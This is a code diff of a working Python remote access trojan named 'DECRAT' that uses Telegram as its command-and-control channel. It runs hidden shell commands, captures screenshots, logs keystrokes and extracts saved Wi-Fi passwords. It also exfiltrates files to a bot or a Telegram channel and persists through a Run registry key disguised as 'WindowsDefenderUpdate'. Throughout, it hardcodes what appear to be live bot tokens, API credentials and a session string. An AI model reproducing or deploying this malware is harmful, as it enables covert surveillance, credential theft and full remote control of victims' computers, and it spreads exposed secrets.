@@ -1,29 +1,27 @@
-# DECRAT v2 — Telegram C2 + Channel uploads (Telethon for large files)
-# pip install requests telethon
-# pyinstaller --onefile --noconsole agent_tg_v2.py
+# DECRAT Final — Telegram C2 + Pyrogram channel uploads
+# pip install requests pyrogram
+# pyinstaller --onefile --noconsole --collect-all pyrogram --name="WindowsUpdate" agent_tg_final.py
 
-import requests, time, subprocess, os, sys, base64, platform, threading, asyncio
+import requests, time, subprocess, os, sys, platform, threading
 
 # ══════════════════════════════════════════════════════════════
 #   CONFIG — YAHAN PASTE KARO
 # ══════════════════════════════════════════════════════════════
-BOT_TOKEN    = "9210089363:AAEIbLdw_XzM7cibtONb3FhqKjnNWE3798s"       # @BotFather se
-CHAT_ID      = "7505093216"         # @userinfobot se
-
-# Large file uploads (Telethon userbot)
-API_ID       = "38629347"          # my.telegram.org
-API_HASH     = "470efaf92b578908891104d8ed7229ac"        # my.telegram.org
-CHANNEL      = "@decrat_sending"    # e.g. "@mychannel"
-PHONE        = "+918529787213"         # e.g. "+919876543210"
+BOT_TOKEN      = "9210089363:AAEIbLdw_XzM7cibtONb3FhqKjnNWE3798s"
+CHAT_ID        = "7505093216"
+API_ID         = "38629347"
+API_HASH       = "470efaf92b578908891104d8ed7229ac"
+SESSION_STRING = "BQJNb-MAFKHYZQwgDL1SkXYvZVY5beRJ3CSt8x7VqF0mopBTUZyD7SfJpdFZ4IFOfhd3cXEJahk9kai9k6V23gILvcCv9YzwLEWQijTC2KDSNyWWABjjESS0XFMqaGmTFqtnSVpiq-sau0XI3h1McGs7kZ7ugcrd-fFPZ9Wc8juVkVLKWTrNc7pDf6EvwCJ-HF_fmljK9dBpmvOY2s4jiQzLe_e6Pbg_lM_x6V6Elb6w8Ix62UrXfPKpmbydY_YnyGt3h4tXaja1TyY1YmxCMAgbb0O2po3lIiAO7n6b0KGG0a7RkbYL1PaY2fFhu4CejUfQ7HREcJ_D_xGzYzok501wI5ldsgAAAAG_VqJgAA"   # ← YAHAN PASTE KARO
+CHANNEL        = "@decrat_sending"
 # ══════════════════════════════════════════════════════════════
 
-POLL_INTERVAL = 3
-API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
+POLL_INTERVAL  = 3
+API_URL        = f"https://api.telegram.org/bot{BOT_TOKEN}"
 last_update_id = 0
-kl_buf     = []
-kl_running = False
+kl_buf         = []
+kl_running     = False
 
-# ── Telegram bot helpers ──────────────────────────────────────────────────────
+# ── Bot helpers ───────────────────────────────────────────────
 def tg_send(text):
     try:
         for i in range(0, len(text), 4000):
@@ -35,14 +33,13 @@ def tg_send(text):
     except: pass
 
 def tg_send_file(filepath, caption=""):
-    """Send via bot (up to 50MB)"""
     try:
         with open(filepath, "rb") as f:
             requests.post(f"{API_URL}/sendDocument",
                 data={"chat_id": CHAT_ID, "caption": caption},
                 files={"document": f}, timeout=60)
         return True
-    except Exception as e:
+    except:
         return False
 
 def tg_get_updates():
@@ -57,148 +54,134 @@ def tg_get_updates():
     except:
         return []
 
-# ── Telethon channel upload (unlimited size) ──────────────────────────────────
+# ── Pyrogram channel upload ───────────────────────────────────
 def channel_upload(filepath, caption=""):
-    """Upload to channel via Telethon userbot — no size limit"""
     try:
-        from telethon.sync import TelegramClient
-        from telethon import functions
-
-        session_path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "tg_session")
-
-        with TelegramClient(session_path, int(API_ID), API_HASH) as client:
-            client.send_file(
+        from pyrogram import Client
+        with Client(
+            "dec",
+            api_id=int(API_ID),
+            api_hash=API_HASH,
+            session_string=SESSION_STRING
+        ) as app:
+            app.send_document(
                 CHANNEL,
                 filepath,
-                caption=caption or os.path.basename(filepath),
-                progress_callback=None
+                caption=caption or os.path.basename(filepath)
             )
         return True
     except Exception as e:
-        tg_send(f"❌ channel upload error: {e}")
+        tg_send(f"❌ channel error: {e}")
         return False
 
-def smart_send_file(filepath, caption=""):
-    """Auto-pick: bot for <50MB, channel for larger"""
+def smart_send(filepath, caption=""):
     try:
-        size = os.path.getsize(filepath)
-        size_mb = size / (1024 * 1024)
-
+        size_mb = os.path.getsize(filepath) / (1024*1024)
         if size_mb < 45:
-            # bot direct send
-            ok = tg_send_file(filepath, caption + f" ({size_mb:.1f}MB)")
+            ok = tg_send_file(filepath, f"{caption} ({size_mb:.1f}MB)")
             if not ok:
-                tg_send(f"❌ bot send failed, trying channel...")
                 channel_upload(filepath, caption)
         else:
-            # large file — channel
-            tg_send(f"📤 File {size_mb:.1f}MB — uploading to channel {CHANNEL}...")
-            ok = channel_upload(filepath, caption + f" ({size_mb:.1f}MB via channel)")
+            tg_send(f"📤 {size_mb:.1f}MB — uploading to {CHANNEL}...")
+            ok = channel_upload(filepath, caption)
             if ok:
-                tg_send(f"✅ Uploaded to {CHANNEL}")
+                tg_send(f"✅ Done — check {CHANNEL}")
     except Exception as e:
-        tg_send(f"❌ send error: {e}")
+        tg_send(f"❌ {e}")
 
-# ── Shell ─────────────────────────────────────────────────────────────────────
+# ── Shell ─────────────────────────────────────────────────────
 def run_shell(cmd):
     try:
-        result = subprocess.run(
-            cmd, shell=True,
-            capture_output=True, text=True,
-            timeout=30,
-            creationflags=0x08000000 if sys.platform=="win32" else 0
-        )
-        out = result.stdout + result.stderr
-        return out.strip() if out.strip() else "[no output]"
+        r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
+            timeout=30, creationflags=0x08000000 if sys.platform=="win32" else 0)
+        out = r.stdout + r.stderr
+        return out.strip() or "[no output]"
     except subprocess.TimeoutExpired:
         return "[timeout]"
     except Exception as e:
         return f"[error: {e}]"
 
-# ── Screenshot ────────────────────────────────────────────────────────────────
+# ── Screenshot ────────────────────────────────────────────────
 def screenshot():
     try:
         import ctypes, struct as st
-        gdi32  = ctypes.windll.gdi32
-        user32 = ctypes.windll.user32
-        w = user32.GetSystemMetrics(0)
-        h = user32.GetSystemMetrics(1)
-        hScreen = user32.GetDC(None)
-        hDC     = gdi32.CreateCompatibleDC(hScreen)
-        hBmp    = gdi32.CreateCompatibleBitmap(hScreen, w, h)
-        gdi32.SelectObject(hDC, hBmp)
-        gdi32.BitBlt(hDC, 0, 0, w, h, hScreen, 0, 0, 0x00CC0020)
+        g = ctypes.windll.gdi32
+        u = ctypes.windll.user32
+        w = u.GetSystemMetrics(0); h = u.GetSystemMetrics(1)
+        hS=u.GetDC(None); hD=g.CreateCompatibleDC(hS)
+        hB=g.CreateCompatibleBitmap(hS,w,h)
+        g.SelectObject(hD,hB); g.BitBlt(hD,0,0,w,h,hS,0,0,0x00CC0020)
         class BIH(ctypes.Structure):
-            _fields_ = [("biSize",ctypes.c_uint32),("biWidth",ctypes.c_int32),
-                        ("biHeight",ctypes.c_int32),("biPlanes",ctypes.c_uint16),
-                        ("biBitCount",ctypes.c_uint16),("biCompression",ctypes.c_uint32),
-                        ("biSizeImage",ctypes.c_uint32),("biXPelsPerMeter",ctypes.c_int32),
-                        ("biYPelsPerMeter",ctypes.c_int32),("biClrUsed",ctypes.c_uint32),
-                        ("biClrImportant",ctypes.c_uint32)]
-        bih = BIH()
-        bih.biSize=ctypes.sizeof(BIH); bih.biWidth=w; bih.biHeight=-h
-        bih.biPlanes=1; bih.biBitCount=24; bih.biCompression=0
+            _fields_=[("biSize",ctypes.c_uint32),("biWidth",ctypes.c_int32),
+                      ("biHeight",ctypes.c_int32),("biPlanes",ctypes.c_uint16),
+                      ("biBitCount",ctypes.c_uint16),("biCompression",ctypes.c_uint32),
+                      ("biSizeImage",ctypes.c_uint32),("biXPelsPerMeter",ctypes.c_int32),
+                      ("biYPelsPerMeter",ctypes.c_int32),("biClrUsed",ctypes.c_uint32),
+                      ("biClrImportant",ctypes.c_uint32)]
+        bih=BIH(); bih.biSize=ctypes.sizeof(BIH)
+        bih.biWidth=w; bih.biHeight=-h; bih.biPlanes=1
+        bih.biBitCount=24; bih.biCompression=0
         row=((w*3+3)&~3); bih.biSizeImage=row*h
         buf=(ctypes.c_byte*bih.biSizeImage)()
-        gdi32.GetDIBits(hDC,hBmp,0,h,buf,ctypes.byref(bih),0)
+        g.GetDIBits(hD,hB,0,h,buf,ctypes.byref(bih),0)
         hdr=14+ctypes.sizeof(BIH)
         bmp=st.pack("<2sIHHI",b"BM",hdr+bih.biSizeImage,0,0,hdr)+bytes(bih)+bytes(buf)
-        gdi32.DeleteObject(hBmp); gdi32.DeleteDC(hDC); user32.ReleaseDC(None,hScreen)
+        g.DeleteObject(hB); g.DeleteDC(hD); u.ReleaseDC(None,hS)
         path="C:\\Windows\\Temp\\ss.bmp"
-        with open(path,"wb") as f: f.write(bmp)
+        open(path,"wb").write(bmp)
         return path
     except: return None
 
-# ── Sysinfo ───────────────────────────────────────────────────────────────────
-def get_sysinfo():
+# ── Sysinfo ───────────────────────────────────────────────────
+def sysinfo():
     return (f"🖥 <b>SYSTEM INFO</b>\n"
             f"OS: {platform.system()} {platform.version()}\n"
             f"Host: {platform.node()}\n"
-            f"User: {os.environ.get('USERNAME', os.environ.get('USER','?'))}\n"
+            f"User: {os.environ.get('USERNAME','?')}\n"
             f"Arch: {platform.machine()}")
 
-# ── Persist ───────────────────────────────────────────────────────────────────
+# ── Persist ───────────────────────────────────────────────────
 def persist():
     try:
         import winreg
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
             r"Software\Microsoft\Windows\CurrentVersion\Run",
             0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key,"WindowsDefenderUpdate",0,winreg.REG_SZ,sys.executable)
-        winreg.CloseKey(key)
-        return "✅ persisted: HKCU Run"
+        winreg.SetValueEx(k,"WindowsDefenderUpdate",0,winreg.REG_SZ,sys.executable)
+        winreg.CloseKey(k)
+        return "✅ persisted"
     except Exception as e:
-        return f"❌ failed: {e}"
+        return f"❌ {e}"
 
-# ── Keylogger ─────────────────────────────────────────────────────────────────
+# ── Keylogger ─────────────────────────────────────────────────
 def kl_start():
     global kl_running
     if kl_running: return "already running"
     kl_running = True
-    def _run():
+    def _r():
         try:
-            import ctypes
-            user32 = ctypes.windll.user32
-            vk_map = {0x20:" ",0x0D:"[ENTER]",0x08:"[BS]",0x09:"[TAB]",0x1B:"[ESC]"}
+            u = ctypes.windll.user32
+            vm = {0x20:" ",0x0D:"[ENTER]",0x08:"[BS]",0x09:"[TAB]",0x1B:"[ESC]"}
             while kl_running:
-                for vk in list(range(0x30,0x5B))+list(vk_map.keys()):
-                    if user32.GetAsyncKeyState(vk)&0x0001:
-                        kl_buf.append(vk_map.get(vk, chr(vk)))
+                for vk in list(range(0x30,0x5B))+list(vm.keys()):
+                    if u.GetAsyncKeyState(vk)&0x0001:
+                        kl_buf.append(vm.get(vk,chr(vk)))
                 time.sleep(0.01)
         except: pass
-    threading.Thread(target=_run, daemon=True).start()
+    import ctypes
+    threading.Thread(target=_r,daemon=True).start()
     return "✅ keylogger started"
 
-# ── Command handler ───────────────────────────────────────────────────────────
+# ── Command handler ───────────────────────────────────────────
 def handle(text):
     text = text.strip()
 
-    if text in ("/start", "/help"):
+    if text in ("/start","/help"):
         return ("📋 <b>Commands</b>\n\n"
                 "/ping\n/sysinfo\n/screenshot\n"
                 "/shell &lt;cmd&gt;\n"
-                "/download &lt;path&gt; — auto bot/channel by size\n"
-                "/channel &lt;path&gt; — force upload to channel\n"
+                "/download &lt;path&gt;\n"
+                "/channel &lt;path&gt; — force channel\n"
                 "/keylog_start | /keylog_dump | /keylog_stop\n"
                 "/persist\n/ip\n/wifi\n/ps\n/users")
 
@@ -206,96 +189,74 @@ def handle(text):
         return f"🟢 alive — {platform.node()}"
 
     elif text == "/sysinfo":
-        return get_sysinfo()
+        return sysinfo()
 
     elif text == "/screenshot":
-        path = screenshot()
-        if path:
-            smart_send_file(path, "📸 screenshot")
-            return None
-        return "❌ screenshot failed"
+        p = screenshot()
+        if p: smart_send(p, "📸 screenshot"); return None
+        return "❌ failed"
 
     elif text.startswith("/shell "):
         out = run_shell(text[7:])
         return f"<code>{text[7:]}</code>\n\n{out}"
 
     elif text.startswith("/download "):
-        path = text[10:].strip()
-        if not os.path.exists(path):
-            return f"❌ file not found: {path}"
-        smart_send_file(path, f"📁 {os.path.basename(path)}")
+        p = text[10:].strip()
+        if not os.path.exists(p): return f"❌ not found: {p}"
+        smart_send(p, f"📁 {os.path.basename(p)}")
         return None
 
     elif text.startswith("/channel "):
-        # force channel upload regardless of size
-        path = text[9:].strip()
-        if not os.path.exists(path):
-            return f"❌ file not found: {path}"
-        size_mb = os.path.getsize(path)/(1024*1024)
-        tg_send(f"📤 Uploading {os.path.basename(path)} ({size_mb:.1f}MB) to {CHANNEL}...")
-        ok = channel_upload(path, f"📁 {os.path.basename(path)}")
-        return f"✅ Done — check {CHANNEL}" if ok else f"❌ failed"
+        p = text[9:].strip()
+        if not os.path.exists(p): return f"❌ not found: {p}"
+        mb = os.path.getsize(p)/(1024*1024)
+        tg_send(f"📤 Uploading {os.path.basename(p)} ({mb:.1f}MB) → {CHANNEL}...")
+        ok = channel_upload(p, f"📁 {os.path.basename(p)}")
+        return f"✅ check {CHANNEL}" if ok else "❌ failed"
 
-    elif text == "/keylog_start":
-        return kl_start()
-
+    elif text == "/keylog_start": return kl_start()
     elif text == "/keylog_dump":
         global kl_running
-        data = "".join(kl_buf); kl_buf.clear()
-        return f"<b>Keylog:</b>\n<code>{data or '[empty]'}</code>"
-
+        d="".join(kl_buf); kl_buf.clear()
+        return f"<b>Keylog:</b>\n<code>{d or '[empty]'}</code>"
     elif text == "/keylog_stop":
-        kl_running = False
-        return "⏹ keylogger stopped"
-
-    elif text == "/persist":
-        return persist()
-
-    elif text == "/ip":
-        return run_shell("ipconfig")
-
+        kl_running=False; return "⏹ stopped"
+    elif text == "/persist": return persist()
+    elif text == "/ip": return run_shell("ipconfig")
     elif text == "/wifi":
-        profiles = run_shell("netsh wlan show profiles")
-        names = [l.split(":")[-1].strip() for l in profiles.split("\n") if "All User Profile" in l]
-        result = ""
-        for name in names:
-            pw = run_shell(f'netsh wlan show profile name="{name}" key=clear')
-            for line in pw.split("\n"):
-                if "Key Content" in line:
-                    result += f"{name}: {line.split(':')[-1].strip()}\n"
-        return result or "no saved passwords found"
-
-    elif text == "/ps":
-        return run_shell("tasklist")
-
-    elif text == "/users":
-        return run_shell("net user")
-
+        p = run_shell("netsh wlan show profiles")
+        names=[l.split(":")[-1].strip() for l in p.split("\n") if "All User Profile" in l]
+        r=""
+        for n in names:
+            pw=run_shell(f'netsh wlan show profile name="{n}" key=clear')
+            for l in pw.split("\n"):
+                if "Key Content" in l: r+=f"{n}: {l.split(':')[-1].strip()}\n"
+        return r or "no passwords"
+    elif text == "/ps": return run_shell("tasklist")
+    elif text == "/users": return run_shell("net user")
     return None
 
-# ── Main loop ─────────────────────────────────────────────────────────────────
+# ── Main ──────────────────────────────────────────────────────
 def main():
-    if sys.platform == "win32":
+    if sys.platform=="win32":
         try:
             import ctypes; ctypes.windll.kernel32.FreeConsole()
         except: pass
-
     global last_update_id
     time.sleep(2)
-    tg_send(f"🟢 Agent v2 connected\n{get_sysinfo()}\n\n📡 Channel: {CHANNEL}")
-
+    tg_send(f"🟢 Agent connected\n{sysinfo()}\n📡 {CHANNEL}")
     while True:
         try:
-            for update in tg_get_updates():
-                last_update_id = update["update_id"]
-                msg = update.get("message", {})
-                if str(msg.get("chat", {}).get("id", "")) != str(CHAT_ID): continue
-                text = msg.get("text", "")
-                if not text: continue
-                response = handle(text)
-                if response: tg_send(response)
+            for u in tg_get_updates():
+                last_update_id = u["update_id"]
+                m = u.get("message",{})
+                if str(m.get("chat",{}).get("id","")) != str(CHAT_ID): continue
+                t = m.get("text","")
+                if not t: continue
+                r = handle(t)
+                if r: tg_send(r)
         except: pass
         time.sleep(POLL_INTERVAL)
 
-if __name__ == "__main__":
+if __name__=="__main__":
     main()
